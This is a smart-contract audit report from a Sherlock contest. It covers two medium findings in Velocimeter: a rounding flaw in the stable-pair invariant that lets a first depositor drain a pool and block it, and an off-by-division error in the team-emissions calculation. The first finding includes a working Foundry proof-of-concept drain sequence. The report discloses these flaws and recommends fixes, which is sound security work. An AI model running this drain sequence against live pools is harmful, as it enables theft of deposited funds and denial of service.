# Velocimeter

> This report contains findings reported in the [Velocimeter](https://audits.sherlock.xyz/contests/442) competition on Sherlock by the me, [@flacko](https://x.com/flack00n), as a part of the Sentryx security team.

# Summary

|Severity|Issues|Unique|
|--|--|--|
|[High](#high)|0|0|
|[Medium](#medium)|2|0|

# Findings

# Medium

## [First liquidity provider of stable pair can DOS it](https://github.com/sherlock-audit/2024-06-velocimeter-judging/issues/279)

## Summary
A rounding error in the calculation of the `k` invariant in Pair.sol carried over from Velodrome's implementation can lead to the `k` invariant of stable pools to equal 0, allowing an attacker to steal whatever's left in the pool.
## Vulnerability Detail
The invariant `k` is calculated as follows:

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L403-L413
```solidity
    function _k(uint x, uint y) internal view returns (uint) {
        if (stable) {
            uint _x = x * 1e18 / decimals0;
            uint _y = y * 1e18 / decimals1;
→           uint _a = (_x * _y) / 1e18;
            uint _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18);
            return _a * _b / 1e18;  // x3y+y3x >= k
        } else {
            return x * y; // xy >= k
        }
    }
```

Where `x` and `y` are the reserves/balances of the two tokens of the pool. Given little enough liquidity provided to the pool, the calculation of `_a` can result in 0 allowing an attacker to deposit minimal liquidity, swap continuously between the two tokens in the pool stealing whatever's left, inflate their LP tokens balance until total supply starts overflowing.

<details>
    <summary>Proof of concept</summary>

    Append the two functions to **Pair.t.sol** and comment out `require(IVoter(voter).governor() == tx.origin, "not governor");` on line 114 in PairFactory.sol (for the sake of simplicity, that part is not relevant to the issue at hand anyway).
    
    ```solidity
    function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal {
        DAI.transfer(address(pair), 1);
        uint amount0;
        uint amount1;
        if (address(DAI) < address(FRAX)) {
            amount0 = 0;
            amount1 = initialFraxAmount - 1;
        } else {
            amount1 = 0;
            amount0 = initialFraxAmount - 1;
        }

        pair.swap(amount0, amount1, address(this), new bytes(0));
        FRAX.transfer(address(pair), 1);

        if (address(DAI) < address(FRAX)) {
            amount0 = initialDaiAmount; // initialDaiAmount + 1 - 1
            amount1 = 0;
        } else {
            amount1 = initialDaiAmount; // initialDaiAmount + 1 - 1
            amount0 = 0;
        }

        pair.swap(amount0, amount1, address(this), new bytes(0));
    }

    function testDestroyPair() public {
        deployCoins();
        deal(address(DAI), address(this), 100 ether);
        deal(address(FRAX), address(this), 100 ether);
        deployPairFactoryAndRouter();

        Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true));

        for(uint i = 0; i < 10; i++) {
            DAI.transfer(address(pair), 10_000_000);
            FRAX.transfer(address(pair), 10_000_000);

            // as long as 10_000_000^2 < 1e18
            uint liquidity = pair.mint(address(this));

            console2.log("pair:", address(pair), "liquidity:", liquidity);
            console2.log("total liq:", pair.balanceOf(address(this)));

            drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair)));

            console2.log("DAI balance:", DAI.balanceOf(address(pair)));
            console2.log("FRAX balance:", FRAX.balanceOf(address(pair)));

            require(DAI.balanceOf(address(pair)) == 1, "should drain DAI balance");
            require(FRAX.balanceOf(address(pair)) == 2, "should drain FRAX balance");
        }

        DAI.transfer(address(pair), 1 ether);
        FRAX.transfer(address(pair), 1 ether);

        vm.expectRevert();
        pair.mint(address(this));
    }
    ```

</details>

## Impact
Stable pairs can be DOSed completely by their first depositor, rendering them useless.
## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L403-L413
## Tool used
Manual Review
## Recommendation
Implement the fix that Velodrome introduced for the issue: https://github.com/velodrome-finance/contracts/commit/59f9c135ccf7685af81f021918c879b21c2c5f04
1. Only allow depositing equal amounts of liquidity to a stable pair pool
2. Require `k` to be above minimum `k`.

## [Miscalculation of team emissions in Minter contract](https://github.com/sherlock-audit/2024-06-velocimeter-judging/issues/231)

## Summary
When a period is updated in the minter and FLOW tokens are emitted for distribution to the Voter contract, the team emissions are supposed to be 5% at most from the weekly emissions, however they are calculated to 5.26% because of incorrect division.
## Vulnerability Detail
The team emissions are calculated in the Minter's `update_period()` function which sends FLOW rewards to the Voter contract every week and it also sends a chunk of that to the Velocimeter team address.

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Minter.sol#L112-L137
```solidity
    function update_period() external returns (uint) {
        uint _period = active_period;
        if (block.timestamp >= _period + WEEK && initializer == address(0)) { // only trigger if new week
            _period = (block.timestamp / WEEK) * WEEK;
            active_period = _period;
            uint256 weekly = weekly_emission();

→           uint _teamEmissions = (teamRate * weekly) /
                (PRECISION - teamRate);
            uint _required =  weekly + _teamEmissions;
            uint _balanceOf = _flow.balanceOf(address(this));
            if (_balanceOf < _required) {
                _flow.mint(address(this), _required - _balanceOf);
            }

            require(_flow.transfer(teamEmissions, _teamEmissions));

            _checkpointRewardsDistributors();

            _flow.approve(address(_voter), weekly);
            _voter.notifyRewardAmount(weekly);

            emit Mint(msg.sender, weekly, circulating_supply());
        }
        return _period;
    }
```

The problem with the `_teamEmissions` calculation is that it divides by less than 100%, so effectively the team emissions will be more than expected.
Let's say the `teamRate` is the `MAX_TEAM_RATE` of 50. `PRECISION` is equal to 1000, so the equation comes out as: $(50 * weekly) / (1000 - 50) = weekly * 50 / 950 = weekly * 0,0526315789$

And instead of taking the maximum of 5% as the code clearly indicates, it'll take 5.26% instead.
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Minter.sol#L30
```solidity
    uint public constant MAX_TEAM_RATE = 50; // 5% max
```
## Impact
Team emissions will be more than the maximum which will affect directly the issuance of FLOW tokens and thus its inflation rate.
## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Minter.sol#L119-L120
## Tool used
Manual Review
## Recommendation
Change the `_teamEmissions` calculation to `(teamRate * weekly) / PRECISION` instead of `(teamRate * weekly) / (PRECISION - teamRate)`.
